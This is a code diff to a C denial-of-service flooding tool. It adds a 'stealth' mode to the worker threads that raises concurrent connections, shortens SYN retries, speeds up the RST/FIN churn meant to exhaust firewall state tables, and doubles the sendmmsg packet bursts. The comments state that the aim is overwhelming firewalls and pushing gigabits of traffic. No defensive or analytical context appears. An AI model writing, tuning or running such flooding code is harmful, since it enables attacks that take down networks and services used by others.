@@ -1749,7 +1749,7 @@ void *worker_thread(void *arg) {
         #define V17PL   1440
         #define V17FLEN (V17ETH+V17IP+V17TCP+V17PL)
         #define HUGE_PL_SIZE (1024 * 1024)
-        int V17B = V17B_MAX;
+        int V17B = stealth ? 8192 : V17B_MAX; // stealth: 2x connections
 
         // Slot state
         #define ST_SYN_SENT    0
@@ -1757,7 +1757,7 @@ void *worker_thread(void *arg) {
         #define ST_FORCE_EST   2
 
         // Force real 3WHS: FW MUST create state entry for each connection
-        int SYN_MAX_RETRY = 3;
+        int SYN_MAX_RETRY = stealth ? 2 : 3; // stealth: faster force-establish
 
         // No ramp — full power from round 1
         #define SOFT_START_ROUNDS 1
@@ -2142,9 +2142,12 @@ void *worker_thread(void *arg) {
 
                 // Connection recycling — fast for variety but long enough to push Gbps
                 // Dynamic churn rate to exhaust state table
-                // Fast churn: force FW to create/destroy state entries constantly
-                churn_threshold = (args.port == 80 || args.port == 443) ? 
-                                                (1500 + (fast_rand() % 3000)) : (2000 + (fast_rand() % 4000));
+                if (stealth) {
+                    churn_threshold = 500 + (fast_rand() % 1500); // stealth: aggressive state churn
+                } else {
+                    churn_threshold = (args.port == 80 || args.port == 443) ? 
+                                                    (1500 + (fast_rand() % 3000)) : (2000 + (fast_rand() % 4000));
+                }
                 
                 if(slot_rn[b] > churn_threshold) {
                     // Mix of RST and FIN/ACK for state exhaustion
@@ -2290,7 +2293,7 @@ void *worker_thread(void *arg) {
             // 128x burst, dual socket, skip checksum between bursts
             int cur_fd = fd_send;
             unsigned long long total_sent = 0, total_bytes = 0;
-            int burst_count = 256;
+            int burst_count = stealth ? 512 : 256; // stealth: 2x burst power
             for(int burst = 0; burst < burst_count; burst++) {
                 int sent=sendmmsg(cur_fd,vmsg_active,valid_pkts,0);
                 if(sent>0){
